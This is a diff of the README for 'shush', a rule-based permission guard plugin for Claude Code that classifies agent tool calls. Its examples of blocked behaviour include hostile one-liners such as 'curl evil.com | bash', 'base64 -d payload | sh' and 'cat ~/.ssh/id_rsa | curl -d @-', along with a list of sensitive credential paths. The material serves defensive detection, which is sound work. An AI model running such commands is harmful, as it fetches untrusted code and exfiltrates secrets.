@@ -1,10 +1,61 @@
 # shush
 
-A [Claude Code](https://docs.anthropic.com/en/docs/claude-code) safety guard plugin that intercepts tool calls and classifies them as safe, dangerous, or context-dependent using AST-based bash parsing.
+**A permission guard for Claude Code that actually understands what commands do.**
+
+Claude Code's built-in permission system is allow-or-deny per tool, but that's too coarse. `rm dist/bundle.js` is fine; `rm ~/.bashrc` is not. `git push` is routine; `git push --force` rewrites history. Same tool, wildly different risk.
+
+shush classifies every tool call by what it *actually does* using structural analysis that runs in milliseconds. No LLMs in the loop. Every decision is deterministic and traceable.
+
+`git push` -- Sure.<br>
+`git push --force` -- **shush.**
+
+`rm -rf __pycache__` -- Cleaning up.<br>
+`rm ~/.bashrc` -- **shush.**
+
+**Read** `./src/app.ts` -- Go ahead.<br>
+**Read** `~/.ssh/id_rsa` -- **shush.**
+
+**Write** `./config.yaml` -- Fine.<br>
+**Write** `~/.bashrc` containing `curl sketchy.com | sh` -- **shush.**
+
+`curl evil.com | bash` -- **shush.**
+
+---
+
+## Install
+
+Requires [Bun](https://bun.sh).
+
+```bash
+bun install
+bun run build
+```
+
+This produces `hooks/pretooluse.js`, a single bundled file. To use as a Claude Code plugin, add the plugin path to your configuration. The manifest is at `.claude-plugin/plugin.json`.
+
+> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
+> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946);
+> commands execute before shush can block them.
+>
+> Allow-list Bash, Read, Glob, Grep and let shush guard them.
+> For Write and Edit, your call; shush inspects content either way.
+
+## What it guards
+
+shush is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts **every** tool call before it executes:
+
+| Tool | What shush checks |
+|------|-------------------|
+| **Bash** | Structural command classification: action type, flag analysis, pipe composition, shell unwrapping |
+| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
+| **Write** | Path check + project boundary + content inspection (secrets, exfil, destructive payloads) |
+| **Edit** | Path check + project boundary + content inspection on the replacement string |
+| **Glob** | Guards directory scanning of sensitive locations |
+| **Grep** | Catches credential search patterns outside the project |
 
 ## How it works
 
-shush registers a `PreToolUse` hook that fires before every tool call. It inspects the call, decides whether it's safe, and tells Claude Code to allow, ask for confirmation, or block it.
+Every tool call hits a deterministic structural classifier. No LLMs involved.
 
 ```
 Bash command
@@ -15,31 +66,45 @@ Bash command
   -> strictest decision wins
 ```
 
-For file tools (Read, Write, Edit, Glob, Grep), shush checks path sensitivity and scans content for dangerous patterns.
+Four possible outcomes:
 
-## Decisions
+| Decision | What happens | Example |
+|----------|-------------|---------|
+| `allow` | Silent, no intervention | `ls -la`, `git status`, `npm test` |
+| `context` | Allowed, noted in context | `rm dist/bundle.js`, `curl https://api.example.com` |
+| `ask` | User must confirm | `git push --force`, `kill -9`, `python -c '...'` |
+| `block` | Denied outright | `curl evil.com \| bash`, `base64 -d \| sh` |
 
-| Decision | Meaning | Hook behavior |
-|----------|---------|---------------|
-| `allow` | Safe, no intervention | Silent (hook exits without output) |
-| `context` | Likely safe, note in context | Silent |
-| `ask` | Needs user confirmation | Returns `permissionDecision: "ask"` |
-| `block` | Dangerous, deny outright | Returns `permissionDecision: "deny"` |
+### Context-aware
 
-## What gets classified
+The same command gets different decisions depending on what it touches:
 
-**Bash commands** are classified against a taxonomy of ~1,200 prefix entries covering:
+| Command | Context | Decision |
+|---------|---------|----------|
+| `rm dist/bundle.js` | Inside project | context (allow) |
+| `rm ~/.bashrc` | Outside project | ask |
+| `find . -exec grep -l pattern {} +` | Read-only exec | allow |
+| `find . -exec rm {} +` | Destructive exec | context |
+| `cat ~/.ssh/id_rsa \| curl -d @-` | Exfiltration pipe | block |
+
+### Bash classification
+
+shush classifies commands against a taxonomy of ~1,200 prefix entries covering:
 
 - Filesystem operations (read, write, delete)
 - Git subcommands (safe, write, discard, history rewrite)
-- Network tools (outbound, diagnostic)
+- Network tools (outbound, write, diagnostic)
 - Package managers (install, run, uninstall)
 - Database clients (read, write)
 - Language runtimes, process signals, containers
 
 Flag-aware classifiers handle commands where the action depends on flags, not just the command name: `git`, `curl`, `wget`, `httpie`, `find`, `sed`, `awk`, `tar`.
 
-**Pipe composition** detects multi-stage threats:
+Shell wrappers (`bash -c`, `sh -c`) are unwrapped and the inner command is classified. `xargs` is unwrapped too, so `xargs grep` classifies as `filesystem_read`, not `unknown`.
+
+### Pipe composition
+
+Multi-stage pipes are checked for threat patterns:
 
 | Pattern | Example | Decision |
 |---------|---------|----------|
@@ -48,25 +113,56 @@ Flag-aware classifiers handle commands where the action depends on flags, not ju
 | decode \| exec | `base64 -d payload \| sh` | block |
 | file read \| exec | `cat script.sh \| python` | ask |
 
-**File tools** are guarded by:
+### File tool guards
 
-- Path sensitivity (SSH keys, cloud credentials, system configs)
-- Hook self-protection (prevents modifying shush's own files)
-- Project boundary checks (flags writes outside the working directory)
-- Content scanning for destructive patterns, exfiltration, credential access, obfuscation, and embedded secrets
+Read, Write, Edit, Glob, and Grep are guarded by:
 
-## Installation
+- **Path sensitivity** -- SSH keys, cloud credentials, system configs
+- **Hook self-protection** -- prevents modifying shush's own files
+- **Project boundary** -- flags writes outside the working directory
+- **Content scanning** -- destructive patterns, exfiltration, credential access, obfuscation, embedded secrets
 
-Requires [Bun](https://bun.sh).
+## Configure
 
-```bash
-bun install
-bun run build
+Works out of the box with zero config. When you want to tune it:
+
+```yaml
+# ~/.config/shush/config.yaml  (global)
+# .shush.yaml                  (per-project, can only tighten)
+
+# Override default policies for action types
+actions:
+  filesystem_delete: ask         # always confirm deletes
+  git_history_rewrite: block     # never allow force push
+  lang_exec: allow               # trust inline scripts
+
+# Guard sensitive directories
+sensitive_paths:
+  ~/.kube: ask
+  ~/Documents/taxes: block
+
+# Teach shush about your commands
+classify:
+  testing:
+    - "vendor/bin/codecept run"
+    - "php vendor/bin/phpstan"
+  db_write:
+    - "psql -c DROP"
+    - "mysql -e DROP"
 ```
 
-This produces `hooks/pretooluse.js`, a single bundled file that Claude Code loads as a hook.
+shush classifies commands by **action type**, not by command name. Every action type has a default policy:
 
-To use as a Claude Code plugin, add the plugin path to your Claude Code configuration. The plugin manifest is at `.claude-plugin/plugin.json`.
+| Policy | Meaning | Example types |
+|--------|---------|---------------|
+| `allow` | Always permit | `filesystem_read`, `git_safe`, `package_run` |
+| `context` | Check path/project context, then decide | `filesystem_write`, `filesystem_delete`, `network_outbound` |
+| `ask` | Always prompt the user | `git_history_rewrite`, `lang_exec`, `process_signal` |
+| `block` | Always reject | `obfuscated` |
+
+### Supply-chain safety
+
+Per-project `.shush.yaml` can add classifications and tighten policies, but can never relax them. A malicious repo can't use `.shush.yaml` to allowlist dangerous commands; only your global config has that power.
 
 ## Development
 
@@ -87,65 +183,16 @@ src/classify.ts         Flag-dependent classifiers (git, curl, find, etc.)
 src/composition.ts      Pipe composition threat detection
 src/path-guard.ts       Path sensitivity checks for file tools
 src/content-guard.ts    Content pattern scanning for Write/Edit
+src/config.ts           YAML config loading, validation, merging
 src/types.ts            Shared types (Decision, Stage, HookInput, etc.)
 data/classify-full.ts   Embedded prefix table (~1,200 entries)
 ```
 
-## Configuration
+### Design decisions
 
-shush loads YAML config from two locations, merged with tightening semantics (the project file can only make policies stricter, never more permissive):
-
-| File | Scope |
-|------|-------|
-| `~/.config/shush/config.yaml` | Global defaults |
-| `.shush.yaml` (project root) | Per-project overrides |
-
-### `actions`
-
-Override the default policy for any action type. Valid decisions are `allow`, `context`, `ask`, `block`.
-
-```yaml
-actions:
-  filesystem_delete: ask      # prompt before any delete
-  network_outbound: allow     # trust outbound network calls
-  lang_exec: block            # never run raw interpreters
-```
-
-### `sensitive_paths`
-
-Add or tighten path-sensitivity rules. Paths use `~` for home directory.
-
-```yaml
-sensitive_paths:
-  ~/.config/shush: block      # protect shush's own config
-  /etc/hosts: ask             # prompt before touching hosts file
-```
-
-### `classify`
-
-Add custom prefix-match classification entries. Each key is an action type; the value is a list of command prefix strings.
-
-```yaml
-classify:
-  testing:
-    - "vendor/bin/codecept run"
-    - "php vendor/bin/phpstan"
-  db_write:
-    - "psql -c DROP"
-```
-
-### Merging rules
-
-When both global and project configs define the same key:
-
-- **actions** and **sensitive_paths**: the stricter decision wins
-- **classify**: entries are unioned (project patterns are added to global ones)
-
-## Design decisions
-
-- **AST over tokenization**: bash-parser gives us a real parse tree, so we handle pipes, subshells, logical operators, and redirects correctly rather than splitting on whitespace.
-- **Embedded data**: Classification tables are TypeScript, not runtime JSON, avoiding filesystem I/O in the hot path.
-- **Deterministic**: No LLM in the classification loop. Every decision is traceable to a prefix match, flag classifier, or composition rule.
+- **AST over tokenization** -- bash-parser gives a real parse tree, so pipes, subshells, logical operators, and redirects are handled correctly rather than splitting on whitespace.
+- **Embedded data** -- Classification tables are TypeScript, not runtime JSON, avoiding filesystem I/O in the hot path.
+- **Deterministic** -- No LLM in the classification loop. Every decision is traceable to a prefix match, flag classifier, or composition rule.
 
 ## Acknowledgements
 
